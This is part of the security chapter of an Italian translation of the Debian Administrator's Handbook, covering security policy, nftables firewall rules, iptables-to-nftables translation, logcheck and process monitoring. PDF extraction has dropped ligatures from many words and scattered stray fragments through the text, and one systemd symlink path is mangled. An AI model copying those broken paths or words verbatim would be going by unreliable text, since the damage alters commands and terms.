                    Sicurezza
                                                                                                   Capitolo 14
                    14. Amministrazione avanzata                                                                 pag. 401
                           1. Come de nire una Security Policy (Politica di Sicurezza)                           pag. 402
                           2. Firewall o Packet Filtering                                                        pag. 403
                                    1. Come funziona nftables                                                    pag. 404
                                    2. Traduzione delle iptables in nftables                                     pag. 406
                                    3. Sintassi di nft                                                           pag. 408
                                    4. Come installare le regole in modo che vengano riprodotte ad ogni          pag. 409
                                    avvio
                           3. Supervisione: prevenzione, rilevamento, dissuasione                                pag. 410
                                    1. Monitoraggio dei logs con logcheck                                        pag. 410
                                    2. Monitoraggio delle attività                                               pag. 411
                                              1. In tempo reale                                                  pag. 411
                                              2. Storico                                                         pag. 411
                                    3. Come evitare le intrusioni                                                pag. 412
                                    4. Rilevamento delle modi che                                                pag. 413
                                              1. La validazione dei pacchetti tramite il comando dpkg --         pag. 413
                                              verify
                                              2. Veri ca dei pacchetti con debsums nonostante i suoi limiti      pag. 414
                                              3. Monitoraggio dei les: AIDE                                      pag. 414
                                              4. Intrusion Detection System/Network Detection System             pag. 416
                                              (IDS/NIDS)
                           4. Introduzione ad AppArmor                                                           pag. 417
                                    1. I principi                                                                pag. 417
                                    2. Come attivare AppArmor e gestire i pro li AppArmor                        pag. 417
                                    3. Come creare un nuovo pro lo                                               pag. 418
                           5. Introduzione a SELinux                                                             pag. 424
                                    1. I principi                                                                pag. 424
                                    2. Come con gurare SELinux                                                   pag. 426
                                    3. Come gestire un sistema SELinux                                           pag. 427
                                              1. Gestione dei moduli SELinux                                     pag. 427
                                              2. Gestione delle identità                                         pag. 428
                                              3. Gestione di File Contexts, Ports e Booleans                     pag. 429
                                    4. Adeguamento delle Regole                                                  pag. 430
                                              1. Come scrivere un le .fc                                         pag. 430
                                              2. Come scrivere un le .if                                         pag. 430
                                              3. Come scrivere un le .te                                         pag. 432
                                              4. Compilazione dei les                                            pag. 435
                           6. Altre considerazioni sulla sicurezza                                               pag. 435
                                    1. I rischi dovuti alle applicazioni web                                     pag. 435
                                    2. Sapere cosa aspettarsi                                                    pag. 436
                                    3. Scegliere il software con prudenza                                        pag. 437
                                    4. Gestire una macchina nel suo insieme                                      pag. 438
                                    5. Gli utenti sono Giocatori/Attori                                          pag. 438
                                    6. Sicurezza sica                                                            pag. 439
                                    7. Responsabilità legale                                                     pag. 439
                           7. Come comportarsi con una macchina compromessa                                      pag. 440
                                    1. Rilevamento ed analisi dell’intrusione del Cracker                        pag. 440
                                    2. Mettere il server of ine                                                  pag. 440
                                    3. Preservare tutto ciò che può costituire una prova                         pag. 441
                                    4. Reinstallazione                                                           pag. 442
                                    5. Analisi forense                                                           pag. 442
                                    6. Ricostruzione dello scenario di un attacco                                pag. 443

                    << Un sistema informativo a seconda del contesto in cui viene utilizzato può avere un livello di
                    rilevanza differente. Difatti in alcuni casi è fondamentale per la sopravvivenza di una società. Di
                    conseguenza necessita della dovuta protezione per scongiurare diversi rischi. Il processo di
                    valutazione dei rischi, che comprende anche la de nizione e l’implementazione dei sistemi di
                    protezione, viene comunemente de nito come “security process” (in ital. trad. non lett. “processo di
                    prevenzione e di gestione degli incidenti di sicurezza”). >>
fi
     fi
          fi
               fi
                          fi
                          fi
                               fi
                               fi
                               fi
                                    fl
                                         fi
                                              fi
                                                   fi
                                                        fi
                                                              fi
     14.1. Come de nire una Security Policy (Politica di Sicurezza)

          ATTENZIONE                 La sicurezza è un argomento talmente vasto e delicato, che non è possibile
                                     affrontarlo in modo esaustivo nella trattazione di un unico capitolo.Verranno
      Qual è lo scopo di
                                     pertanto delineati soltanto alcuni punti importanti e presentati alcuni strumenti e
      questo capitolo                metodi che possono essere utilizzati nel “security domain” [nella logica del primo
                                     ordine (il linguaggio formale di rappresentazione degli enunciati, delle relazioni e
                                     del ragionamento logico) il dominio è l’insieme degli oggetti di un modello, che a
                                     sua volta include non solo gli oggetti, ma anche le relazioni fra quest’ultimi]. Per chi
                                     fosse interessato, la documentazione sull’argomento è abbondante tanto che sono
                                     state scritte intere opere che lo trattano. Un eccellente punto di partenza è il libro
                                     Linux Server Security di Michael D. Bauer (pubblicato da O'Reilly).

     Il termine "sicurezza" comprende una vasta serie di concetti, strumenti e procedure, che non
     possono singolarmente essere applicati universalmente. Scegliere quale implementare richiede una
     consapevolezza riguardo al ne da raggiungere. Ovvero per proteggere un sistema occorre porsi in
     fase ex ante alcune domande. Difatti con la mera implementazione arbitraria degli strumenti
     difensivi senza piani cazione si rischia il paradosso dell’assenza di sicurezza riguardo ad aspetti
     rilevanti.

     Per prima cosa dovrete porvi un obiettivo. Le seguenti domande potrebbero aiutarvi a tale scopo:
     • Cosa desiderate proteggere? La politica di sicurezza non può essere universale e cambia in base a
     cosa si sta cercando di proteggere, ad esempio un computer o dei dati. E se si tratta di dati, la politica
     di sicurezza cambia anche in base al tipo di dati.
     • Da quale “incidente di sicurezza” desiderate proteggervi? Un furto di dati riservati? Una
     perdita accidentale dei dati? Una perdita di entrate dovuta all'interruzione dei servizi offerti dalla
     vostra società?
     • Inoltre, da chi state cercando protezione? Le misure di sicurezza differiscono a seconda si tratti di
     un errore umano di un utente regolare del sistema [o impiegato] o di un attacco di un dato gruppo di
     malintenzionati.

     Il termine rischio viene normalmente associato a tre fattori: cosa deve essere protetto, quale
     evento si desidera scongiurare e chi potrebbe farlo accadere. Le risposte a queste tre domande
     consente di de nire un modello di rischio. Dopodiché sarà possibile stabilire una politica di sicurezza
     e concretizzare le dovute azioni.

                 NOTA                Bruce Schneier, un esperto di sicurezza riconosciuto a livello mondiale (non
                                     soltanto di sicurezza informatica) è solito sconfessare uno dei miti sulla sicurezza
      Un interrogativo
                                     con la seguente frase “La sicurezza è un processo, non un prodotto”. Ovvero le
      perpetuo                       risorse da proteggere cambiano con il trascorre degli anni così come le minacce ed i
                                     mezzi a disposizione dei malintenzionati. Quindi nonostante la presenza di una
                                     politica di sicurezza perfettamente progettata ed implementata, non potrete
                                     sentirvi mai completamente al sicuro. I fattori di rischio evolvono e la vostra
                                     controffensiva dovrà fare altrettanto.

     Nella de nizione di una politica di sicurezza dovrete tenere in considerazione i vincoli che possono
     limitarne l’applicabilità. Ovvero no a che punto siete disposti ad arrivare per mettere in sicurezza il
     vostro sistema? Tale domanda ha un impatto notevole riguardo all’implementazione di una politica
     di sicurezza. Spesso si è soliti credere che la risposta sia in uenzata soltanto dai costi economici,
     invece non è così dato che occorre valutare anche gli effetti negativi di una politica di sicurezza in
     termini di inconvenienti per gli utenti del sistema o di degradazione delle prestazioni.
     Pertanto si ribadisce che soltanto dopo aver de nito un modello di rischio potrete stabilire una
     politica di sicurezza ef ciente.

     Pagina 402 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
       fi
            fi
                 fi
                      fi
                           fi
                                fi
                                                 fi
                                                               fl
                        NOTA            In alcuni casi la scelta delle azioni da intraprendere per proteggere un sistema può
           Politiche agli               essere estremamente semplice.
                                        Ad esempio, se il sistema da proteggere è costituito esclusivamente da un computer
           antipodi                     di seconda mano utilizzato per i conteggi di ne giornata, potreste ragionevolmente
                                        decidere di non fare nulla di speciale per la sua sicurezza. Infatti il valore
                                        economico del sistema in sé è basso. Mentre quello dei dati è pari a zero in quanto
                                        non vengono archiviati nel suddetto computer. Pertanto un potenziale malvivente
                                        anche se riuscisse ad in ltrarsi nel “sistema” otterrebbe un’ingombrante
                                        calcolatrice.
                                        In conclusione il costo per la protezione di un sistema simile potrebbe di gran lunga
                                        essere superiore al costo di un’eventuale violazione di sicurezza.
                                        In altri casi potreste desiderare la protezione dei dati con denziali a discapito di
                                        qualsiasi altra considerazione. Ovvero anche attraverso la distruzione completa dei
                                        dati (rimozione sicura dei les, distruzione dell’hard disk facendolo a pezzi e
                                        trattando poi i singoli pezzi con acido, ecc.). Diversamente se i dati devono essere
                                        conservati per un loro possibile utilizzo in futuro (ma senza essere accessibili) ed il
                                        costo della loro protezione non è soggetto a vincoli, si potrebbe optare per la loro
                                        memorizzazione su dischi in lega di platino-iridio immagazzinati in bunker a prova
                                        di bomba, scavati in diverse montagne sparse nel mondo, con segretazione della
                                        loro posizione e sottoponendoli a vigilanza militare ...
                                        Per quanto le politiche sopra descritte possano sembrare estreme, in realtà
                                        rappresentano la risposta adeguata nella misura opportuna a dei rischi de niti,
                                        tenuti in conto gli obiettivi da raggiungere ed i vincoli da rispettare. Solo la politica
                                        di sicurezza derivante da una decisione ponderata potrà essere considerata degna
                                        di rispetto.

          Nella maggior parte dei casi il sistema informativo è suddiviso in sottosistemi coerenti ed
          indipendenti. Ciascuno di questi sottosistemi ha dei requisiti e dei limiti a se stanti, di conseguenza
          ogni sottosistema necessita di una politica di sicurezza progettata ad hoc. Per fare ciò dovrete tenere
          presente il seguente principio: un perimetro breve e ben de nito è più facile da difendere da uno
          vasto e senza con ni. Persino l'organizzazione della rete dovrà essere progettata in base al suddetto
          principio: i servizi più sensibili dovranno essere concentrati su un numero ristretto di macchine e
          quest’ultime dovranno essere accessibili solo attraverso un numero inferiore di check-points; difatti
          la progettazione della protezione dei check-points sarà meno onerosa rispetto alla progettazione
          della sicurezza di ogni singola macchina sensibile da esporre ai rischi del mondo esterno. Per tali
          ragioni nel suddetto contesto sono adeguate soluzioni come il network ltering (che comprendono i
            rewalls). Il network ltering può essere implementato sia da hardware dedicato, sia da software
            rewalls, come quello integrato dal Linux kernel, che rappresentano soluzioni più semplici e
            essibili.

          14.2. Firewall o Packet Filtering

                 BASILARE               Un firewall è una componente, hardware e/o software, di un sistema informatico,
                                        che veri ca i pacchetti della reta in entrata ed in uscita (provenienti da o destinati
           Firewall
                                        alla rete locale) per poi lasciar giungere a destinazione solo quelli che soddisfano
                                        determinate condizioni prede nite.

                                                                        TDAH_2.0       Capitolo XIV - Sicurezza Pagina 403
fi
fl
fi
     fi
               fi
                    fi
                         fi
                              fi
                                   fi
                                            fi
                                                          fi
                                                                   fi
                                                                            fi
                                                                                 fi
          Un rewall è un ltering network gateway ef cace solo sui pacchetti di rete che lo attraversano.
          Di conseguenza l’ef cienza di un rewall dipende dal fatto che i pacchetti vengano instradati
          attraversandolo.

             SPECIFIC CASE                            Potrete limitare l’azione di un rewall locale ad una singola macchina (e non ad
           Local Firewall                             un’intera rete locale); il suo ruolo quindi sarà ltrare o impedire l'accesso ad alcuni
                                                      servizi, onde evitare che vengano instaurate connessioni in uscita da software
                                                      fraudolento installato volontariamente o involontariamente dall'utente.

          Il Kernel Linux abilita net lter rewall per impostazione prede nita e potrete gestirlo dall’user
          space attraverso i comandi iptables, ip6tables, arptables ed ebtables.

          In ogni caso i comandi iptables di Net lter sono ormai stati sostituiti da nftables, che ha superato
          diverse problematiche del precedente. In particolare include meno duplicate code [duplicazione
          del codice - per replicare una funzionalità nello stesso programma o fra diversi programmi gestiti o
          appartenenti alla stessa entità] e può essere gestito semplicemente attraverso il comando nft.
          Debian Buster utilizza il framework di nftables per impostazione prede nita.

          # apt install -y nftables
          Reading package lists … Done

          # systemctl enable nftables.service
          Created symlink /etc/systemd/system/sysvinit.target.sante/nftables.service -> /lib/
          -> systemd/system/nftables.service

          14.2.1 Il funzionamento di nftables

          nftables consente di ispezionare un pacchetto di rete mentre lo processa, ponendo la correlata fase
          in pausa. Ciò permette ad esempio: di far decadere o eliminare i pacchetti in entrata; modi care i
          pacchetti in diversi modi; bloccare determinati pacchetti in uscita per veri care la presenza di
          malware; dirigere nuovamente dei pacchetti nel più breve tempo possibile all’interfaccia bridge di
          rete; distribuire il carico dei pacchetti in entrata fra diversi sistemi.

          È essenziale che prendiate dimestichezza con i layer 3,4,5 del modello OSI (Open Systems
          Interconnection) per poter bene ciare delle funzionalità di net lter al meglio.

                   CULTURA                            Il modello OSI è uno schema concettuale utile per implementare i protocolli di rete
           Il modello OSI                             senza dover tenere in considerazione la sottostante struttura e tecnologia. Ciò
                                                      facilita l’interoperabilità fra diversi sistemi di comunicazione attraverso i protocolli
                                                      di comunicazione standard.

                                                      Il modello OSI è de nito dallo standard ISO/EIC 7498. A seguire sono descritti i sette
                                                      “layers” (livelli):
                                                      1 Phisical ( sico): trasmissione e ricezione degli streams (canali o ussi) di raw bits
                                                      attraverso un mezzo sico;
                                                      2 Data Link (connessione dati): trasmissione af dabile dei frames (unità) di dati fra
                                                      due nodi collegati fra loro attraverso una connessione basata sul precedente
                                                      phisical layer.

          Pagina 404 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
              fi
                   fi
                        fi
                        fi
                             fi
                                  fi
                                       fi
                                            fi
                                                 fi
                                                         fi
                                                              fi
                                                                   fi
                                                                        fi
                                                                                  fl
                                                                                       fi
                                                                                            fi
                                                                                                  fi
                                                                                                       fi
                                                                                                                     fi
                                                     3 Network (rete): struttura e gestione di una rete multi-node; include addressing,
                                                     routing e controllo del traf co;
                                                     4 Transport (trasporto): trasmissione af dabile dei data segments [porzioni di dati
                                                     in lettura e scrittura, diversamente dai code segments che sono solo in lettura] fra
                                                     punti [partenza e nale] su una rete; include segmentation, aknowledgment [ACK -
                                                     riconoscimento dell’avvenuta ricezione] e multiplexing [multiplazione - tecnica
                                                     attraverso cui diversi canali, analogici o digitali, in ingresso se combinati in unico
                                                     segnale hanno comunque in uscita la stessa capacità trasmissiva];
                                                     5 Session (sessione): gestione delle sessioni di comunicazione, ad esempio il
                                                     continuo scambio di informazioni fra due nodi sotto forma di trasmissioni back-and-
                                                     forth;
                                                     6 Presentation (Presentazione): traduzione dei dati fra un servizio di rete ed un
                                                     applicazione; include codi ca dei caratteri, compressione dati e criptazione/
                                                     decriptazione;
                                                     7 Application (Applicazione): APIs (di alto livello); include condivisione delle
                                                     risorse e remote le access [servizio che consente di accedere, gestire, modi care e
                                                     condividere i les da remoto].

                                                          https://en.wikipedia.org/wiki/Osi_model

               Il rewall è con gurato attraverso tables, che contengono le rules (regole) incluse in chains
               (catene). Diversamente da iptables, nftables non dispone di tabelle prede nite. Difatti è l’utente
               a stabilire quante tabelle possedere e come realizzarle. A ciascuna tabella può essere assegnata
               soltanto una delle seguenti cinque famiglie: ip, ip6, inet, arp e bridge.
               Ci sono due tipi di chains: base chains e regular chains. Un base chain è un entry point per i
               pacchetti provenienti in stack dalla rete e registrati nei Netfilter hooks, ad esempio le catene
               rilevano i pacchetti in transito attraverso lo stack TCP/IP. Diversamente, una regular chain non è
               annessa a nessun hook, pertanto non rileva il traf co, ma può essere usata a scopo gestionale come
               un jump target.
               Le regole sono composte di statements [dichiarazioni], ovvero trattano la corrispondenza di
               espressioni e le conseguenti verdict statements [dichiarazioni decisionali] come accept [accetta
               il pacchetto], drop [lascia decadere il pacchetto], queue [metti in coda il pacchetto], continue
               [continua], return [ritorna alla regola della precedente chain chiamata], jump chain [salta alla
               chain de nita se il pacchetto corrisponde al target], goto chain [vai alla chain de nita].

                                    BASILARE         ICMP (Internet Control Message Protocol) è un protocollo impiegato per
                    ICMP                             trasmettere le informazioni complementari sulle comunicazioni. Il suddetto
                                                     protocollo consente di testare il funzionamento della connessione di rete attraverso
                                                     il comando ping (che invia un messaggio di ICMP echo request in modo da
                                                     ricevere dal destinatario un messaggio ICMP echo reply). Inoltre: avvisa se un
                                                     pacchetto è stato ri utato da un rewall; indica un over ow [un sovracaricamento]
                                                     del receive buffer [buffer di ricezione]; offre un instradamento migliore per i nuovi
                                                     pacchetti in connessione; ecc. Il protocollo ICMP è stato de nito da diversi
                                                     documenti RFC; i primi documenti RFC777 e RFC792, sono stati celermente
                                                     integrati ed estesi.

                                                          http://www.faqs.org/rfcs/rfc777.html
                                                          http://www.faqs.org/rfcs/rfc792.html

                                                     Si ricorda che un buffer di ricezione è una piccola area di memoria che immagazzina
                                                     i dati nell’intervallo temporale compreso fra i due seguenti eventi: l’arrivo dei dati
                                                     dalla rete; l’elaborazione dei dati da parte del kernel. Se la sopracitata area di
                                                     memoria diventa piena non può ricevere altri dati, di conseguenza il protocollo
                                                     ICMP segnala il problema al mittente in modo che quest’ultimo riduca il suo transfer
                                                     rate (e così si raggiunga un equilibrio dopo un po’).
                                                     In aggiunta si precisa che mentre una rete IPv4 può funzionare senza ICMP, una
                                                     rete IPv6 necessità di ICMPv6 imprescindibilmente, dato che combina diverse
                                                     funzionalità che nell’IPv4 erano gestite da ICMPv4, IGMP (Internet Group
                                                     Membership Protocol) e ARP (Address Resolution Protocol).
                                                     ICMPv6 è de nito nel documento RFC4443.

                                                          http://www.faqs.org/rfcs/rfc4443.html

                                                                                     TDAH_2.0       Capitolo XIV - Sicurezza Pagina 405
fi
     fi
          fi
               fi
                     fi
                     fi
                          fi
                               fi
                                      fi
                                           fi
                                                fi
                                                     fi
                                                                      fi
                                                                       fl
                                                                            fi
                                                                                          fi
                                                                                                     fi
                                                                                                          fi
14.2.2 Traduzione delle iptables in nftables

I comandi iptables-translate e ip6tables-translate possono essere usati per tradurre vecchi
comandi iptables nella nuova sintassi ntftables. Possono essere tradotti interi rulesets e l’use-
case illustrato a seguire mostra la migrazione in un computer in cui è installato Docker:

# iptables-save > iptables-ruleset.txt
# iptables-restore-translate -f iptables-ruleset.txt

# Translated by iptables-restore-translate v1.8.2 on Thu Jul 18 10:39:33 2019
add table ip filter
add chain ip filter INPUT { type filter hook input priority 0; policy accept; }
add chain ip filter FORWARD { type filter hook forward priority 0; policy drop; }
add chain ip filter OUTPUT { type filter hook output priority 0; policy accept; }
add chain ip filter DOCKER
add chain ip filter DOCKER-ISOLATION-STAGE-1
add chain ip filter DOCKER-ISOLATION-STAGE-2
add chain ip filter DOCKER-USER
add rule ip filter FORWARD counter jump DOCKER-USER
add rule ip filter FORWARD counter jump DOCKER-ISOLATION-STAGE-1
add rule ip filter FORWARD oifname ”docker0” ct state related,established counter
-> accept
add rule ip filter FORWARD oifname ”docker0” counter jump DOCKER
add rule ip filter FORWARD iifname ”docker0” oifname != ”docker0” counter accept
add rule ip filter FORWARD iifname ”docker0” oifname ”docker0” counter accept
add rule ip filter DOCKER-ISOLATION-STAGE-1 iifname ”docker0” oifname != ”docker0”
-> counter jump DOCKER-ISOLATION-STAGE-2
add rule ip filter DOCKER-ISOLATION-STAGE-1 counter return
add rule ip filter DOCKER-ISOLATION-STAGE-2 oifname ”docker0” counter drop
add rule ip filter DOCKER-ISOLATION-STAGE-2 counter return
add rule ip filter DOCKER-USER counter return
add table ip nat
add chain ip nat PREROUTING { type nat hook prerouting priority -100; policy accept;
-> }
add chain ip nat INPUT { type nat hook input priority 100; policy accept; }
add chain ip nat POSTROUTING { type nat hook postrouting priority 100; policy accept;
-> }
add chain ip nat OUTPUT { type nat hook output priority -100; policy accept; }
add chain ip nat DOCKER
add rule ip nat PREROUTING fib daddr type local counter jump DOCKER
add rule ip nat POSTROUTING oifname != ”docker0” ip saddr 172.17.0.0/16 counter
-> masquerade
add rule ip nat OUTPUT ip daddr != 127.0.0.0/8 fib daddr type local counter jump
-> DOCKER
add rule ip nat DOCKER iifname ”docker0” counter return
# Completed on Thu Jul 18 10:39:33 2019
# iptables-restore-translate -f iptables-ruleset.txt > ruleset.nft
# nft -f ruleset.nft
# nft list ruleset

Pagina 406 Il Manuale dell’Amministratore di Debian TDAH_2.0
table ip filter {
chain INPUT {
type filter hook input priority 0; policy accept;
}
chain FORWARD {
type filter hook forward priority 0; policy drop;
counter packets 0 bytes 0 jump DOCKER-USER
counter packets 0 bytes 0 jump DOCKER-ISOLATION-STAGE-1
oifname ”docker0” ct state related,established counter packets 0
-> bytes 0 accept
oifname ”docker0” counter packets 0 bytes 0 jump DOCKER
iifname ”docker0” oifname != ”docker0” counter packets 0 bytes 0
-> accept
iifname ”docker0” oifname ”docker0” counter packets 0 bytes 0 accept
}
chain OUTPUT {
type filter hook output priority 0; policy accept;
}
chain DOCKER {
}
chain DOCKER-ISOLATION-STAGE-1 {
iifname ”docker0” oifname != ”docker0” counter packets 0 bytes 0 jump
➥ DOCKER-ISOLATION-STAGE-2
counter packets 0 bytes 0 return
}
chain DOCKER-ISOLATION-STAGE-2 {
oifname ”docker0” counter packets 0 bytes 0 drop
counter packets 0 bytes 0 return
}
chain DOCKER-USER {
counter packets 0 bytes 0 return
}
}
table ip nat {
chain PREROUTING {
type nat hook prerouting priority -100; policy accept;
fib daddr type local counter packets 0 bytes 0 jump DOCKER
}
chain INPUT {
type nat hook input priority 100; policy accept;
}

                                             TDAH_2.0   Capitolo XIV - Sicurezza Pagina 407
chain POSTROUTING {
type nat hook postrouting priority 100; policy accept;
oifname != ”docker0” ip saddr 172.17.0.0/16 counter packets 0 bytes 0
-> masquerade
}
chain OUTPUT {
type nat hook output priority -100; policy accept;
ip daddr != 127.0.0.0/8 fib daddr type local counter packets 0 bytes
-> 0 jump DOCKER
}
chain DOCKER {
iifname ”docker0” counter packets 0 bytes 0 return
}
}
table ip mangle {
chain PREROUTING {
type filter hook prerouting priority -150; policy accept;
}
chain INPUT {
type filter hook input priority -150; policy accept;
}
chain FORWARD {
type filter hook forward priority -150; policy accept;
}
chain OUTPUT {
type route hook output priority -150; policy accept;
}
chain POSTROUTING {
type filter hook postrouting priority -150; policy accept;
}
}

Gli strumenti iptables-nft, ip6tables-nft, arptables-nft , ebtables-nft sono versioni di
iptables che impiegano nftables API, così che gli utenti possano riprendere l’uso della sintassi
iptables, anche se non è raccomandabile; questi strumenti dovrebbero essere usati solo per scopi
di retrocompatibilità.

14.2.3. Sintassi di nft

I comandi nft consentono di gestire le tabelle, le catene e le regole. L’opzione table supporta
molteplici operazioni: add, create, delete, list e flush [per “pulire” un intero ruleset]. nft add
table ip6 mangle aggiunge una nuova tabella della famiglia ip6.

Pagina 408 Il Manuale dell’Amministratore di Debian TDAH_2.0
     Per includere una nuova base chain alla tabella filter, potrete eseguire il seguente comando (se
     utilizzate bash il semicolon [;] viene preceduto da un backslash [\])

     # nft add chain filter input { type filter hook input priority 0 \; }

     Le regole vengono solitamente aggiunte con la seguente sintassi: nft add rule [family] table
     chain handle handle statement

     Il comando insert è simile ad add, ma la regola è anteposta all’inizio della catena (e non alla ne) o
     prima della regola con un dato handle (e non dopo la regola). Per esempio, il seguente comando
     include una regola prima della regola con handler 8:

     # nft insert rule filter output position 8 ip daddr 127.0.0.8 drop

     I comandi nft non effettuano cambiamenti permanenti alla con gurazione, pertanto saranno
     perduti se non verranno salvati. Le regole del rewall sono conservate in /etc/nftables.conf. Per
     salvare in modo permanente la con gurazione del rewall dovrete eseguire nft list ruleset > /
     etc/nftables.conf come root.

     nft include diverse funzionalità, che potrete approfondire attraverso la sua man page nft(8).

     14.2.4 Come installare le regole in modo che vengano riprodotte ad ogni avvio

     Per abilitare come impostazione prede nita il rewall in Debian, dovrete salvare le regole in /etc/
     nftables.conf ed eseguire systemctl enable nftables.service come root.

     In altri casi, è preferibile registrare lo script di con gurazione attraverso la direttiva up del le /
     etc/network/interfaces. Nell’esempio seguente, lo script viene conservato in /usr/local/etc/
     arrakis.fw .

                    Esempio 14.1 Il le interface che chiama lo script di con gurazione del rewall

     auto eth0
     iface eth0 inet static
         address 192.168.0.1
         network 192.168.0.0
      netmask 255.255.255.0
     broadcast 192.168.0.255
     up /usr/local/etc/arrakis.fw

     Ovviamente si presuppone che abbiate utilizzato ifupdown per con gurare l’interfaccia di rete. Se
     state utilizzando altro (ad esempio NetworkManager o systemd-networkd) dovrete fare riferimento
     alla correlata documentazione, in particolare per lo script da eseguire successivamente aver
     con gurato l’interfaccia.

                                                           TDAH_2.0       Capitolo XIV - Sicurezza Pagina 409
fi
       fi
                            fi
                                 fi
                                        fi
                                        fi
                                             fi
                                                  fi
                                                  fi
                                                           fi
                                                                fi
                                                                     fi
                                                                                          fi
                                                                                               fi
          14.3. Supervisione: prevenzione, rilevamento, dissuasione

          Il monitoraggio è parte integrante di qualsiasi politica di sicurezza per diverse ragioni. Difatti
          l’obiettivo di una politica di sicurezza non è soltanto garantire la riservatezza dei dati,
          ma anche la disponibilità dei servizi. Quindi dovrete assicurarvi che tutto funzioni come previsto,
          rilevare in tempi ragionevoli eventuali anomalie nel funzionamento o cambiamenti nella qualità dei
          servizi erogati. L'attività di monitoraggio può facilitare il rilevamento di tentativi di in ltrazione e
          pertanto consentirvi l’attuazione di una rapida controffensiva prima che si veri chino conseguenze
          gravi. Questo il capitolo tratterà alcuni strumenti che possono essere impiegati per monitorare
          diversi aspetti di un sistema Debian. Di fatto integra il paragrafo 12.4, "Monitoring [Monitoraggio o
          Supervisione]" a pagina 372.

          14.3.1. Monitoraggio dei logs con logcheck

          Il programma logcheck monitora i log les ogni ora per impostazione prede nita. Inoltre invia via e-
          mail i messaggi di logs più insoliti all’amministratore per un’analisi più accurata
          L'elenco dei les monitorati viene memorizzato nel le /etc/logcheck/logcheck.logfiles; non
          dovrete modi care i valori prede niti a meno che non abbiate modi cato radicalmente il le /etc/
          rsyslog.conf.

          logcheck processa in 3 modalità (più o meno dettagliate): paranoid, server e workstation. La
          prima modalità è “verbose” (molto dettagliata), per cui è adatta a server dedicati (come i rewalls).
          La seconda modalità, abilitata per impostazione prede nita, è raccomandata per la maggior parte dei
          servers. La terza modalità è destinata alle workstations ed è la meno dettagliata (è la modalità che
           ltra più messaggi).

          Qualunque modalità venga scelta è consigliabile comunque con gurare logcheck per escludere i
          messaggi super ui (in base ai servizi installati), a meno che l’amministratore non desideri ricevere
          ad ogni ora una mole di emails inutili. La procedura di selezione dei messaggi è relativamente
          complessa ed in caso di necessità dovrete consultare /usr/share/doc/logcheck-database/
          README.logcheck-database.gz.

          Le regole possono essere distinte in diversi tipi:
          • quelle che quali cano un messaggio come un tentativo di cracking (vengono salvate in un le nella
          directory /etc/logcheck/cracking.d/);
          • quelle che si occupano della rimozione dei messaggi quali cati come tentativo di cracking (/etc/
          logcheck/cracking.ignore.d/);
          • quelle che quali cano un messaggio come avviso di sicurezza (/etc/logcheck/violations.d/);
          • quelle che si occupano della rimozione dei messaggi quali cati come avviso di sicurezza (/etc/
          logcheck/violations.ignore.d/);
          • ed in ne quelle che si applicano a tutti i restanti messaggi (quali cati come system events -
          eventi di sistema).

                   ATTENZIONE        Qualsiasi messaggio contrassegnato come tentativo di cracking o avviso di
               Come si ignora        sicurezza (a seguito ad esempio di una regola nel le /etc/logcheck/
                                     violations.d/myfile) può essere ignorato immettendo una regola nel le /etc/
               un messaggio
                                     logcheck/violations.ignore.d/myfile o nel le /etc/logcheck/
                                     violations.ignore.d/myfile-extension.

          Pagina 410 Il Manuale dell’Amministratore di Debian TDAH_2.0
fi
     fi
          fi
               fi
                    fl
                         fi
                         fi
                                fi
                                        fi
                                             fi
                                                  fi
                                                       fi
                                                            fi
                                                                 fi
                                                                 fi
                                                                      fi
                                                                           fi
                                                                                fi
                                                                                     fi
                                                                                          fi
                                                                                               fi
                                                                                                    fi
                                                                                                         fi
                                                                                                              fi
                                                                                                                   fi
Un evento di sistema verrà sempre segnalato, a meno che una regola in una delle directories /etc/
logcheck/ignore.d.{paranoid,server,workstation}/ non imponga di ignorarlo. Ovviamente
solo le directories corrispondenti ad un livello di verbosità maggiore o uguale al livello della modalità
operativa prescelta verranno prese in considerazione.

14.3.2. Monitoraggio delle attività

14.3.2.1. In tempo reale

top è uno strumento interattivo che consente la visualizzazione dell'elenco dei processi correnti. Per
impostazione prede nita organizza la sua tabella partendo dal carico corrente della CPU (che si può
comunque richiedere attraverso il tasto P). In ogni caso è possibile richiedere la memoria occupata
(tasto M), il total processor time (tasto T) o il numero identi cativo del processo o PID (tasto N).
Attraverso il tasto k [che è la lettera iniziale del lemma inglese “kill”] potrete terminare un
processo immettendo il suo numero identi cativo.
Attraverso il tasto r [che è la lettera iniziale del lemma inglese “renicing”] potrete cambiare la
priorità di un processo.

Qualora il vostro sistema sembrasse sovraccarico, attraverso top potrete veri care quali processi
sono in competizione per il processor time o quale consuma troppa memoria. Viene impiegato anche
per valutare se i processi che consumano risorse corrispondono effettivamente a dei servizi reali che
la macchina ospita. Ad esempio quando un processo sconosciuto è in esecuzione sotto l'utente www-
data [in un web server] dovrebbe impensierirvi e dovreste valutarlo, in quanto è molto probabile
che si tratti di un’istanza del software installato [e legittimo - come apache, nginx, ecc.] in
esecuzione però sulla macchina a causa di una vulnerabilità in un'applicazione web.
top è uno strumento molto essibile con una correlata man page che descrive come personalizzare
la visualizzazione in base alle proprie esigenze o agli usi.
Lo strumento con interfaccia gra ca gnome-system-monitor è simile a top ed offre
sostanzialmente le stesse funzionalità.

14.3.2.2 Storico

Il carico della CPU, il traf co di rete e lo spazio disponibile sul disco sono informazioni che
variano continuamente. L’analisi dello storico e di conseguenza dell’evoluzione delle suddette
informazioni è utile per individuare l’uso che viene fatto del computer.

Esistono diversi strumenti dedicati a questa attività. La maggior parte di questi strumenti raccoglie i
dati tramite SNMP (Simple Network Management Protocol) allo scopo di centralizzare le
informazioni. Ciò pertanto consente di recuperare anche le informazioni sugli elementi della rete che
non sono necessariamente computers di tipo general-purpose, ma ad esempio routers di rete dedicati
o switches.

Questo libro tratta in dettaglio Munin (andate a leggere il paragrafo 12.4.1, “Con gurazione di
Munin” a pagina 372) nel Capitolo 12: “Amministrazione avanzata” a pagina 328. Debian offre un
tool simile denominato cacti. Il suo deployment è leggermente più complesso, dato che si basa solo
su SNMP. Inoltre, nonostante offra un'interfaccia web, i concetti relativi alla sua con gurazione sono
poco intuitivi. La lettura della correlata documentazione HTML (/usr/share/doc/cacti/html/
Table-of-Contents.html) è essenziale.

                                                      TDAH_2.0    Capitolo XIV - Sicurezza Pagina 411
        fi
             fi
                  fl
                       fi
                               fi
                                                 fi
                                                                    fi
                                                                         fi
                                                                              fi
             ALTERNATIVA                                                     mrtg (incluso nell'omonimo pacchetto) è uno strumento avanti negli anni.
           mrtg                                                              Nonostante il pro lo spartano, mrtg è in grado di raccogliere gli storici dei dati e di
